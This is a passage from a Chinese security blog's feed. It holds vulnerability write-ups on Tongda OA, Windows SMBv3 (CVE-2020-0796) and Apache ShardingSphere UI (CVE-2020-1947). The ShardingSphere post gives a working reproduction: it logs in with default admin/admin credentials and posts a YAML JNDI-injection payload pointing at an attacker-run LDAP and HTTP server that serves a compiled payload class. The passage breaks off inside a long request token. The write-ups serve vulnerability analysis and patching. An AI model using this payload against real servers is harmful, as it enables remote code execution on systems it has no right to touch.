class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">V11版：http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe</span><br><span class="line">2017版：http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe</span><br><span class="line">2016版：http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe</span><br><span class="line">2015版：http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe</span><br><span class="line">2013增强版：http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe</span><br><span class="line">2013版：http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe</span><br></pre></td></tr></table></figure><h4 id="六、附录"><a href="#六、附录" class="headerlink" title="六、附录"></a>六、附录</h4><h5 id="本次分析及复现的相关工具地址"><a href="#本次分析及复现的相关工具地址" class="headerlink" title="本次分析及复现的相关工具地址"></a>本次分析及复现的相关工具地址</h5><p><a href="https://github.com/SecurityCN/Vulnerability-analysis/tree/master/通达OA3月漏洞" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/tree/master/通达OA3月漏洞</a></p><h5 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h5><p>*<a href="http://club.tongda2000.com/forum.php?mod=viewthread&amp;tid=128377&amp;extra=page%3D1" target="_blank" rel="noopener">http://club.tongda2000.com/forum.php?mod=viewthread&amp;tid=128377&amp;extra=page%3D1</a><br>*<a href="https://www.webshell.cc/6379.html" target="_blank" rel="noopener">https://www.webshell.cc/6379.html</a><br>*<a href="https://www.cnblogs.com/-qing-/p/10944118.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10944118.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;【漏洞分析&amp;amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现&lt;br&gt;&lt;img src=&quot;/2020/03/17/【漏洞分析&amp;漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png&quot; alt&gt;&lt;/p&gt;
&lt;table
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="www.ja0k.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="安全研究" scheme="www.ja0k.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="PHP-Web安全" scheme="www.ja0k.com/tags/PHP-Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞通告】CVE-2020-0796/Windows SMBv3远程代码执行漏洞安全通告(内含Exp视频和检测方法)</title>
    <link href="www.ja0k.com/2020/03/12/%E3%80%90%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%91%8A%E3%80%91CVE-2020-0796Windows%20SMBv3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E9%80%9A%E5%91%8A%EF%BC%88%E5%86%85%E5%90%ABExp%E8%A7%86%E9%A2%91%E5%92%8C%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%EF%BC%89/"/>
    <id>www.ja0k.com/2020/03/12/【漏洞通告】CVE-2020-0796Windows SMBv3远程代码执行漏洞安全通告（内含Exp视频和检测方法）/</id>
    <published>2020-03-12T15:31:47.000Z</published>
    <updated>2020-03-15T06:24:08.695Z</updated>
    
    <content type="html"><![CDATA[<p>【漏洞通告】CVE-2020-0796/Windows SMBv3远程代码执行漏洞安全通告(内含Exp视频和检测方法)<br><img src="/2020/03/12/【漏洞通告】CVE-2020-0796Windows SMBv3远程代码执行漏洞安全通告（内含Exp视频和检测方法）/2020-03-13-13-27-15.png" alt></p><h3 id="一、事件背景"><a href="#一、事件背景" class="headerlink" title="一、事件背景"></a>一、事件背景</h3><p>3月10日，微软发布了KB4551762安全更新，修复了在微软服务器消息块3.1.1（SMBv3）中发现的预授权RCE Windows 10漏洞（CVE-2020-0796）。在2020年3月补丁星期二活动日披露了关于该漏洞的细节，两天后公布安全更新。根据微软的说法，KB4551762安全更新解决的是“网络通信协议的问题，它提供共享访问文件、打印机和串行端口”。</p><h3 id="二、漏洞信息"><a href="#二、漏洞信息" class="headerlink" title="二、漏洞信息"></a>二、漏洞信息</h3><table><thead><tr><th>漏洞名称</th><th>Windows SMBv3远程代码执行漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>CVE-2020-0796</td></tr><tr><td>影响范围</td><td>影响Windows 10 1903及之后的各个版本</td></tr><tr><td>威胁等级</td><td>严重</td></tr><tr><td>公开时间</td><td>2020年3月10日</td></tr></tbody></table><h3 id="三、影响范围"><a href="#三、影响范围" class="headerlink" title="三、影响范围"></a>三、影响范围</h3><p>漏洞影响Windows 10 1903及之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows 10 Version 1903 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1903 for x64-based Systems</span><br><span class="line">Windows 10 Version 1903 for ARM64-based Systems</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br></pre></td></tr></table></figure><p>正是目前主流操作系统版本，在个人、企业环境应用广泛。</p><h3 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h3><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。</p><h3 id="五、漏洞复现"><a href="#五、漏洞复现" class="headerlink" title="五、漏洞复现"></a>五、漏洞复现</h3><h4 id="5-1-检测工具"><a href="#5-1-检测工具" class="headerlink" title="5.1 检测工具"></a>5.1 检测工具</h4><p>目前已公开漏洞检查工具<br><a href="https://github.com/SecurityCN/SMBGhost" target="_blank" rel="noopener">https://github.com/SecurityCN/SMBGhost</a></p><p>nmap扫描CVE-2020-0796的nse脚本<br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/CVE-2020-0796/cve-2020-0796.nse" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/CVE-2020-0796/cve-2020-0796.nse</a></p><h4 id="5-2-漏洞复现"><a href="#5-2-漏洞复现" class="headerlink" title="5.2 漏洞复现"></a>5.2 漏洞复现</h4><p>SophosLabs的Offensive Research团队开发并共享了一个本地特权升级概念验证的漏洞利用演示视频，该漏洞使具有低级特权的攻击者可以获得系统级特权<br><img src="/2020/03/12/【漏洞通告】CVE-2020-0796Windows SMBv3远程代码执行漏洞安全通告（内含Exp视频和检测方法）/2020-03-13-13-19-57.png" alt><br><img src="/2020/03/12/【漏洞通告】CVE-2020-0796Windows SMBv3远程代码执行漏洞安全通告（内含Exp视频和检测方法）/2020-03-13-13-20-47.png" alt><br>Kryptos Logic表示：“即使不存在要分析的补丁程序，也很难发现SMB漏洞。”恶意攻击者几乎可以自己对CVE-2020-0796进行利用。</p><p>详细可以观看视频</p><iframe height="498" width="900" src="https://v.qq.com/txp/iframe/player.html?vid=l0933zw7k5v&width=640&height=498&width=270&height=200" frameborder="0" allowfullscreen></iframe><p>*视频来自网络</p><h3 id="六、修复建议"><a href="#六、修复建议" class="headerlink" title="六、修复建议"></a>六、修复建议</h3><h4 id="6-1-升级"><a href="#6-1-升级" class="headerlink" title="6.1 升级"></a>6.1 升级</h4><p>微软官方已发布漏洞修复更新，</p><ol><li>及时更新系统补丁——设置-&gt;更新和安全-&gt;Windows更新，点击“检查更新”，根据业务情况开展评估，下载并安装相应的安全补丁，更新后重启系统生效，并观察系统及业务运行状态。<br><img src="/2020/03/12/【漏洞通告】CVE-2020-0796Windows SMBv3远程代码执行漏洞安全通告（内含Exp视频和检测方法）/2020-03-13-13-26-56.png" alt></li><li>下载离线补丁包：<br><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762" target="_blank" rel="noopener">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762</a></li></ol><h4 id="6-2-缓解措施"><a href="#6-2-缓解措施" class="headerlink" title="6.2 缓解措施"></a>6.2 缓解措施</h4><p>对于暂时无法应用此安全更新的管理员，微软提供了针对SMB服务器的缓解措施，并建议使用此PowerShell命令禁用SMBv3压缩（无需重新启动，不会阻止SMB客户端的利用）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path </span><br><span class="line"></span><br><span class="line">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure><p>此外，还建议企业客户在企业外围防火墙处阻止TCP端口445，防止试图利用此漏洞对SMB服务器进行攻击。</p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p>*<a href="https://www.bleepingcomputer.com/news/security/microsoft-releases-kb4551762-security-update-for-smbv3-vulnerability/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/microsoft-releases-kb4551762-security-update-for-smbv3-vulnerability/</a><br>*<a href="https://github.com/SecurityCN/SMBGhost" target="_blank" rel="noopener">https://github.com/SecurityCN/SMBGhost</a><br>*<a href="https://gist.github.com/nikallass/40f3215e6294e94cde78ca60dbe07394" target="_blank" rel="noopener">https://gist.github.com/nikallass/40f3215e6294e94cde78ca60dbe07394</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;【漏洞通告】CVE-2020-0796/Windows SMBv3远程代码执行漏洞安全通告(内含Exp视频和检测方法)&lt;br&gt;&lt;img src=&quot;/2020/03/12/【漏洞通告】CVE-2020-0796Windows SMBv3远程代码执行漏洞安全通告（内含Exp视频
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="漏洞通告" scheme="www.ja0k.com/tags/%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%91%8A/"/>
    
      <category term="Windows安全" scheme="www.ja0k.com/tags/Windows%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞分析&amp;环境搭建】CVE-2020-1947/Apache ShardingSphere UI YAML解析远程代码执行漏洞</title>
    <link href="www.ja0k.com/2020/03/12/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&amp;%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%91CVE-2020-1947_Apache_ShardingSphere%20UI%20YAML%E8%A7%A3%E6%9E%90%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>www.ja0k.com/2020/03/12/【漏洞分析&amp;环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/</id>
    <published>2020-03-12T06:11:47.000Z</published>
    <updated>2020-03-15T06:29:57.503Z</updated>
    
    <content type="html"><![CDATA[<p>##【漏洞分析&amp;环境搭建】CVE-2020-1947/Apache ShardingSphere UI YAML解析远程代码执行漏洞<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-14-00-59.png" alt></p><h3 id="一、事件背景"><a href="#一、事件背景" class="headerlink" title="一、事件背景"></a>一、事件背景</h3><p>近日，Apache官方发布了ShardingSphere 新版本修复了一个YAML解析导致的远程代码执行漏洞（CVE-2020-1947）。<br>Apache ShardingSphere是一套开源的分布式数据库中间件解决方案组成的生态圈，它由Sharding-JDBC、Sharding-Proxy和Sharding-Sidecar（规划中）这3款相互独立，却又能够混合部署配合使用的产品组成。它们均提供标准化的数据分片、分布式事务和数据库治理功能，可适用于如Java同构、异构语言、云原生等各种多样化的应用场景。</p><h3 id="二、漏洞信息"><a href="#二、漏洞信息" class="headerlink" title="二、漏洞信息"></a>二、漏洞信息</h3><table><thead><tr><th>漏洞名称</th><th>Apache ShardingSphere UI YAML解析远程代码执行漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>CVE-2020-1947</td></tr><tr><td>影响范围</td><td>Apache ShardingSphere UI &lt;= 4.0.1</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2020年3月10日</td></tr></tbody></table><h3 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h3><h4 id="3-1-补丁对比"><a href="#3-1-补丁对比" class="headerlink" title="3.1 补丁对比"></a>3.1 补丁对比</h4><p><a href="https://github.com/apache/incubator-shardingsphere/releases" target="_blank" rel="noopener">https://github.com/apache/incubator-shardingsphere/releases</a><br>通过4.0.1 版本的change-log 中的Enhancement 可以看到添加了一个类过滤器构造函数以限制来自YAML的非法类。<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-14-49-30.png" alt></p><p>incubator-shardingsphere-4.0.1\sharding-core\sharding-core-common\src\main\java\org\apache\shardingsphere\core\yaml\engine\ClassFilterConstructor.java<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-15-51-12.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public final class ClassFilterConstructor extends Constructor &#123;</span><br><span class="line">    </span><br><span class="line">    private final Collection&lt;Class&lt;?&gt;&gt; acceptClasses;</span><br><span class="line">    </span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; getClassForName(final String name) throws ClassNotFoundException &#123;</span><br><span class="line">        for (Class&lt;? extends Object&gt; each : acceptClasses) &#123;</span><br><span class="line">            if (name.equals(each.getName())) &#123;</span><br><span class="line">                return super.getClassForName(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new IllegalArgumentException(String.format(&quot;Class is not accepted: %s&quot;, name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加了一个白名单类acceptClasses列表用for each进行遍历，其他危险的类调用将会被拒绝，如本次Poc中的调用类JdbcRowSetImpl<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-16-08-06.png" alt></p><p>再看4.0.0 版本中<br>src/main/java/org/apache/shardingsphere/ui/util/ConfigurationYamlConverter.java 直接使用unmarshal方法对输入的YAML直接进行解析，没有做校验。那么就可以参考Fastjson的反序列化漏洞，通过com.sun.rowset.JdbcRowSetImpl类远程调用来进行JNDI注入。<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-15-32-45.png" alt><br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-18-04-51.png" alt><br>漏洞触发点就是YAML</p><h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><h4 id="4-1-搭建-Apache-ShardingSphere-UI环境"><a href="#4-1-搭建-Apache-ShardingSphere-UI环境" class="headerlink" title="4.1 搭建 Apache ShardingSphere UI环境"></a>4.1 搭建 Apache ShardingSphere UI环境</h4><ol><li><p>github下载的 Apache ShardingSphere UI 需要编译之后使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">编译过程</span><br><span class="line">#wget -c https://github.com/apache/incubator-shardingsphere/archive/4.0.0.tar.gz</span><br><span class="line">#cd incubator-shardingsphere/shrding-ui/</span><br><span class="line">#mvn clean package -Prelease</span><br><span class="line">Get the package in shardingsphere-ui/shardingsphere-ui-distribution/shardingsphere-ui-bin-distribution/target/apache-shardingsphere-incubating-$&#123;latest.release.version&#125;-shardingsphere-ui-bin.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>也可以在官网下载Linux版本二进制程序包 （建议大家用此方法）<br><a href="https://shardingsphere.apache.org/document/current/cn/downloads/" target="_blank" rel="noopener">https://shardingsphere.apache.org/document/current/cn/downloads/</a><br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-17-48-07.png" alt><br>下载地址：<br><a href="https://mirrors.tuna.tsinghua.edu.cn/apache/incubator/shardingsphere/4.0.0/apache-shardingsphere-incubating-4.0.0-sharding-ui-bin.tar.gz" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/apache/incubator/shardingsphere/4.0.0/apache-shardingsphere-incubating-4.0.0-sharding-ui-bin.tar.gz</a><br>解压<br>tar -xf apache-shardingsphere-incubating-4.0.0-sharding-ui-bin.tar.gz </p></li></ol><p>sharding-ui是一个标准的springboot程序，可以通过conf/application.properties配置相关信息</p><p><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-19-52-06.png" alt></p><p>可以看到默认监听 8088 端口，默认管理员口令为 admin/admin （生产环境建议修改密码）<br>进入程序目录运行启动程序<br>bin/start.sh<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-14-42-11.png" alt><br>通过浏览器访问8088端口<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-14-36-31.png" alt></p><p>使用默认口令即可登录成功<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-14-43-51.png" alt></p><p>添加1个注册中心 Zookeeper<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-16-42-40.png" alt><br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-16-42-59.png" alt><br>*注意：这里不一定需要搭建Zookeeper，只有填入一个地址即可（不能填写127.0.0.1，否则报错）<br>如果想搭建可以参考教程<a href="https://www.jianshu.com/p/a5fda39f20d0" target="_blank" rel="noopener">https://www.jianshu.com/p/a5fda39f20d0</a></p><h4 id="4-2-使用Poc进行验证"><a href="#4-2-使用Poc进行验证" class="headerlink" title="4.2 使用Poc进行验证"></a>4.2 使用Poc进行验证</h4><ol><li>构造ExportObject并编译<br>ExportObject.java<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-17-05-14.png" alt></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将ExportObject.java编译</span><br><span class="line">javac ExportObject.java</span><br></pre></td></tr></table></figure><p>2.启动HTTPserver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在ExportObject.class当前目录打开终端中执行</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-17-06-59.png" alt><br>启动Httpserver，地址为<br><a href="http://192.168.80.1:8000" target="_blank" rel="noopener">http://192.168.80.1:8000</a></p><ol start="3"><li>利用marshalsec工具启用ldap或rmi 监听1389端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.80.1:8000/#ExportObject</span><br></pre></td></tr></table></figure></li></ol><p><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-17-07-49.png" alt></p><ol start="4"><li>发送Poc 触发YAML<br>Poc<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;CVE-2020-1947&quot;,</span><br><span class="line">  &quot;ruleConfiguration&quot;: &quot;  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5&quot;,</span><br><span class="line">  &quot;dataSourceConfiguration&quot;: &quot;!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://192.168.80.1:1389/ExportObject\n  autoCommit: true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>完整请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /api/schema HTTP/1.1</span><br><span class="line">Host: 192.168.80.138:8088</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Access-Token: eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsImJhc2U2NCI6eyJlbmNvZGVUYWJsZSI6WzY1LDY2LDY3LDY4LDY5LDcwLDcxLDcyLDczLDc0LDc1LDc2LDc3LDc4LDc5LDgwLDgxLDgyLDgzLDg0LDg1LDg2LDg3LDg4LDg5LDkwLDk3LDk4LDk5LDEwMCwxMDEsMTAyLDEwMywxMDQsMTA1LDEwNiwxMDcsMTA4LDEwOSwxMTAsMTExLDExMiwxMTMsMTE0LDExNSwxMTYsMTE3LDExOCwxMTksMTIwLDEyMSwxMjIsNDgsNDksNTAsNTEsNTIsNTMsNTQsNTUsNTYsNTcsNDMsNDddLCJkZWNvZGVUYWJsZSI6Wy0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDYyLC0xLDYyLC0xLDYzLDUyLDUzLDU0LDU1LDU2LDU3LDU4LDU5LDYwLDYxLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDAsMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsLTEsLTEsLTEsLTEsNjMsLTEsMjYsMjcsMjgsMjksMzAsMzEsMzIsMzMsMzQsMzUsMzYsMzcsMzgsMzksNDAsNDEsNDIsNDMsNDQsNDUsNDYsNDcsNDgsNDksNTAsNTFdLCJkZWNvZGVTaXplIjozLCJlbmNvZGVTaXplIjo0LCJQQUQiOjYxLCJwYWQiOjYxLCJ1bmVuY29kZWRCbG9ja1NpemUiOjMsImVuY29kZWRCbG9ja1NpemUiOjQsImxpbmVMZW5ndGgiOjAsImNodW5rU2VwYXJhdG9yTGVuZ3RoIjoyfSwiZ3NvbiI6eyJjYWxscyI6eyJ0aHJlYWRMb2NhbEhhc2hDb2RlIjoxMzk4MDMyNzAxfSwidHlwZVRva2VuQ2FjaGUiOnsiaW50Ijp7fSwiamF2YS5sYW5nLkJvb2xlYW4iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwucmVmbGVjdC5QcmVKYXZhOVJlZmxlY3Rpb25BY2Nlc3NvciI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlJlZmxlY3RpdmVUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Kc29uQWRhcHRlckFubm90YXRpb25UeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fSwib3JnLmFwYWNoZS5jb21tb25zLmNvZGVjLmJpbmFyeS5CYXNlNjQiOnt9LCJqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyXHUwMDNjP1x1MDAzZVx1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlR5cGVBZGFwdGVycyQzNSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5FeGNsdWRlciI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLkRhdGVUeXBlQWRhcHRlciQxIjp7fSwiY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyXHUwMDNjP1x1MDAzZSI6e30sImJvb2xlYW4iOnt9LCJkb3VibGUiOnt9LCJqYXZhLnV0aWwuTGlzdFx1MDAzY2NvbS5nb29nbGUuZ3Nvbi5UeXBlQWRhcHRlckZhY3RvcnlcdTAwM2UiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzAiOnt9LCJqYXZhLmxhbmcuU3RyaW5nIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDI2Ijp7fSwiY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5GaWVsZE5hbWluZ1N0cmF0ZWd5Ijp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDMyIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVGltZVR5cGVBZGFwdGVyJDEiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuQ29uc3RydWN0b3JDb25zdHJ1Y3RvciI6e30sImphdmEudXRpbC5NYXBcdTAwM2NqYXZhLmxhbmcucmVmbGVjdC5UeXBlLCBjb20uZ29vZ2xlLmdzb24uSW5zdGFuY2VDcmVhdG9yXHUwMDNjP1x1MDAzZVx1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlNxbERhdGVUeXBlQWRhcHRlciQxIjp7fSwiY29tLmdvb2dsZS5nc29uLkV4Y2x1c2lvblN0cmF0ZWd5Ijp7fSwiamF2YS5sYW5nLkJ5dGUiOnt9LCJqYXZhLmxhbmcuQ2xhc3NcdTAwM2M/XHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLkluc3RhbmNlQ3JlYXRvclx1MDAzYz9cdTAwM2UiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwucmVmbGVjdC5SZWZsZWN0aW9uQWNjZXNzb3IiOnt9LCJjb20uZ29vZ2xlLmdzb24uRmllbGROYW1pbmdQb2xpY3kkMSI6e30sImNvbS5nb29nbGUuZ3Nvbi5Hc29uIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuQXJyYXlUeXBlQWRhcHRlciQxIjp7f